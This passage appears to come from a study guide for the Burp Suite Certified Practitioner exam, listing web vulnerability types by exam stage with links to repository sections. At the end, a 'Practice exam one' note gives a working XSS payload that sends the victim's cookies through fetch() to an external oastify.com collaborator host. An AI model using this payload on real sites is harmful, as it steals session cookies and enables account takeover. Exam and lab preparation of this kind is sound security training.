[File upload vulnerabilities](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities)  


**Misc**  
[Cross-origin resource sharing (CORS) + Information disclosure](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#cross-origin-resource-sharing-cors--information-disclosure)  
[WebSockets](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#websockets)  
[Prototype pollution](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#prototype-pollution)  


**Possible Vulnerabilities**   
Kudos to https://github.com/botesjuan/ for this awesome image, that defines possible vulnerabilities on exam.  
![image](https://user-images.githubusercontent.com/58632878/225064808-72de66b7-ef3a-4915-a9bf-d253d7f981f6.png)  

**Stage 1**  
[Host Header Poison](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-host-header-attacks)  
[Web cache poisoning](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#web-cache-poisoning)  
[Password reset function](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#3-password-reset-broken-logic)  
[HTTP request smuggling](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-request-smuggling)  
[XSS](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#xss)  

**Stage 2**  
[JSON RoleID](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#1-user-role-can-be-modified-in-user-profile)  
[SQL Injection](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#sql-injection)  
[CSRF Refresh Password isloggedin true](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#10-csrf-refresh-password-isloggedin-true)  
[JWT](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#jwt)  

**Stage 3**  
[Admin user import via XML](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-user-import-via-xml)  
[Path Traversal](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#directory-traversal)  
[Admin panel - Download report as PDF SSRF](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel---download-report-as-pdf-ssrf)  
[Admin panel - RFI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-rfi)  
[Admin panel - SSTI](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#6-admin-panel-password-reset-email-ssti)  
[Admin panel - ImgSize](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner/#5-admin-panel-imgsize-command-injection)  


## Practice exam one

after finding the xss vulnerability:
```
document.location='https://0a9e0011040cf6738278429a004b0072.web-security-academy.net/?SearchTerm="-fetch('https%3A%2F%2Fbgvi9nnedmvq0eryzu34cbqic9i06vuk%252Eoastify%252Ecom%3Fc%3D'%2Bbtoa(document['cookie']))-"
```
